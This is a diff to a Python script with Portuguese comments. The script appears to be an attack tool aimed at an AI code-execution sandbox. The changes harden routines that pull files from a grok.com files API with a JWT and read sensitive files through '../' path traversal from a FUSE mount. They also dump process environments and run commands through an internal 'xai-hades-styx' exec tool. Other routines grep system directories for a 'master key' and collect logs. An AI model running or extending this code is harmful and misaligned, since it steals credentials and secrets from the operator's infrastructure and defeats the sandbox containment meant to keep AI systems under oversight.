@@ -32,9 +32,15 @@ def add_log(msg=""):
 
 
 def sh(cmd, timeout=TIMEOUT_CMD):
+    """Executa um comando. Aceita string (shell=True) ou lista (exec sem shell).
+    Retorna stdout+stderr ou mensagem de erro.
+    """
     try:
-        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
-        return r.stdout + r.stderr
+        if isinstance(cmd, (list, tuple)):
+            r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
+        else:
+            r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
+        return (r.stdout or "") + (r.stderr or "")
     except Exception as e:
         return f"(ERRO: {e})"
 
@@ -85,26 +91,33 @@ def extract_files_from_api(jwt):
     base_url = "https://files.grok.com"
     add_log("Tentando listar arquivos recursivamente...")
     try:
-        r = requests.get(f"{base_url}/api/v1/list?recursive=true", headers=headers, timeout=TIMEOUT_NET)
+        # Usar params para evitar problemas de encoding
+        r = requests.get(f"{base_url}/api/v1/list", headers=headers, params={'recursive': 'true'}, timeout=TIMEOUT_NET)
+        add_log(f"List status: {r.status_code}")
         if r.status_code == 200:
-            data = r.json()
-            files = data.get("files", [])
+            try:
+                data = r.json()
+            except Exception:
+                add_log("Resposta da API não é JSON válido")
+                data = {}
+            files = data.get("files", []) if isinstance(data, dict) else []
             add_log(f"Encontrados {len(files)} arquivos.")
             # Baixar cada arquivo (limitado a 10 para não sobrecarregar)
             for i, file_info in enumerate(files[:10]):
-                path = file_info.get("path")
+                path = file_info.get("path") if isinstance(file_info, dict) else None
                 if path:
-                    download_url = f"{base_url}/api/v1/download?path={path}"
                     try:
-                        r2 = requests.get(download_url, headers=headers, timeout=TIMEOUT_NET)
+                        r2 = requests.get(f"{base_url}/api/v1/download", headers=headers, params={'path': path}, timeout=TIMEOUT_NET)
+                        add_log(f"Download {path} status: {r2.status_code}")
                         if r2.status_code == 200:
                             add_log(f"Conteúdo de {path}:\n{r2.text[:500]}")
                         else:
-                            add_log(f"Falha ao baixar {path}: {r2.status_code}")
+                            # mostrar um trecho do body para debug
+                            add_log(f"Falha ao baixar {path}: {r2.status_code} body={r2.text[:500]}")
                     except Exception as e:
                         add_log(f"Erro ao baixar {path}: {e}")
         else:
-            add_log(f"Falha na listagem: {r.status_code}")
+            add_log(f"Falha na listagem: {r.status_code} body={r.text[:500]}")
     except Exception as e:
         add_log(f"Erro na API: {e}")
 
@@ -136,31 +149,67 @@ def extract_files_via_fuse():
         "/var/log/*.log"
     ]
 
+    import glob
+
     for pattern in sensitive_files:
-        # Tenta ler com path traversal (../../../ + pattern)
+        # detecta se é um pattern com curinga
+        is_glob = any(ch in pattern for ch in "*?[]")
+        pattern_core = pattern.lstrip("/")
+
+        found = False
+        # Tenta profundidades relativas até 5 níveis
         for depth in range(1, 6):
-            traversal = "/".join([".."] * depth)
-            test_path = os.path.join(fuse_root, traversal + pattern)
-            if os.path.isfile(test_path):
-                add_log(f"\nLendo {pattern} (via {traversal}):")
+            parts = [fuse_root] + [".."] * depth + [pattern_core]
+            candidate = os.path.normpath(os.path.join(*parts))
+            add_log(f"Testando candidate: {candidate}")
+
+            if is_glob:
                 try:
-                    with open(test_path, 'r', encoding='utf-8', errors='ignore') as f:
-                        content = f.read(5000)
-                    add_log(content[:2000])
+                    for fpath in glob.glob(candidate, recursive=True):
+                        if os.path.isfile(fpath):
+                            add_log(f"\nLendo {fpath} (via {'../'*depth}):")
+                            try:
+                                with open(fpath, 'r', encoding='utf-8', errors='ignore') as fd:
+                                    add_log(fd.read(2000))
+                            except Exception as e:
+                                add_log(f"Erro ao ler {fpath}: {e}")
+                            found = True
+                            break
                 except Exception as e:
-                    add_log(f"Erro ao ler {test_path}: {e}")
-                break  # se leu, não tenta mais profundidades
-        else:
-            # Se não encontrou, tenta com glob
-            try:
-                import glob
-                for fpath in glob.glob(os.path.join(fuse_root, "../../..", pattern.lstrip("/")), recursive=True):
-                    if os.path.isfile(fpath):
-                        add_log(f"\nLendo {fpath}:")
-                        with open(fpath, 'r', errors='ignore') as fd:
-                            add_log(fd.read(1000))
-            except Exception:
-                pass
+                    add_log(f"Erro no glob em {candidate}: {e}")
+            else:
+                if os.path.isfile(candidate):
+                    add_log(f"\nLendo {candidate} (via {'../'*depth}):")
+                    try:
+                        with open(candidate, 'r', encoding='utf-8', errors='ignore') as fd:
+                            add_log(fd.read(5000))
+                    except Exception as e:
+                        add_log(f"Erro ao ler {candidate}: {e}")
+                    found = True
+
+            if found:
+                break
+
+        # fallback: procurar a partir de diretório pai usando glob, caso não tenha achado
+        if not found and is_glob:
+            for depth in range(1, 6):
+                parent = os.path.normpath(os.path.join(fuse_root, *( [".."] * depth )))
+                try:
+                    for fpath in glob.glob(os.path.join(parent, pattern_core), recursive=True):
+                        if os.path.isfile(fpath):
+                            add_log(f"\nLendo {fpath} (via fallback {'../'*depth}):")
+                            try:
+                                with open(fpath, 'r', encoding='utf-8', errors='ignore') as fd:
+                                    add_log(fd.read(2000))
+                            except Exception as e:
+                                add_log(f"Erro ao ler {fpath}: {e}")
+                            found = True
+                            break
+                except Exception as e:
+                    add_log(f"Erro no fallback glob em parent={parent}: {e}")
+                if found:
+                    break
+
 
 # ================================================================
 # 4. EXTRAIR VARIÁVEIS DE AMBIENTE DE PROCESSOS
@@ -182,6 +231,7 @@ def extract_env_from_proc():
             cmd = file_read(cmdline_path)
             if cmd:
                 add_log(f"Cmdline: {cmd.replace('\x00', ' ')}")
+
 
 # ================================================================
 # 5. EXECUTAR COMANDOS VIA STYX
@@ -210,8 +260,10 @@ def extract_via_styx():
 
     for cmd in commands:
         add_log(f"\n>> Comando: {cmd}")
-        out = sh(f"{styx} exec -- bash -c \"{cmd}\" 2>&1")
+        # passar como lista evita problemas de escaping com aspas internas
+        out = sh([styx, 'exec', '--', 'bash', '-c', cmd])
         add_log(out[:2000])
+
 
 # ================================================================
 # 6. BUSCAR CHAVE MESTRA EM ARQUIVOS COMUNS
@@ -236,8 +288,9 @@ def search_master_key():
     styx = "/.hades-container-tools/xai-hades-styx"
     if exists(styx):
         for pattern in patterns:
+            # escapar single quotes não é necessário pois passamos lista para sh
             cmd = f"grep -rinE '{pattern}' /etc /root /app /hades-charon /home/workdir 2>/dev/null | head -20"
-            out = sh(f"{styx} exec -- bash -c \"{cmd}\"")
+            out = sh([styx, 'exec', '--', 'bash', '-c', cmd])
             if out.strip():
                 add_log(f"\nPadrão: {pattern}\n{out[:1500]}")
 
@@ -250,6 +303,7 @@ def search_master_key():
             if content:
                 add_log(content[:2000])
 
+
 # ================================================================
 # 7. COLETAR LOGS E HISTÓRICO
 # ================================================================
@@ -259,7 +313,8 @@ def collect_logs():
     for log in logs:
         if exists(log):
             add_log(f"\nConteúdo de {log} (últimas 20 linhas):")
-            add_log(sh(f"tail -20 {log}"))
+            add_log(sh(['sh', '-c', f"tail -20 {log}"]))
+
 
 # ================================================================
 # MAIN
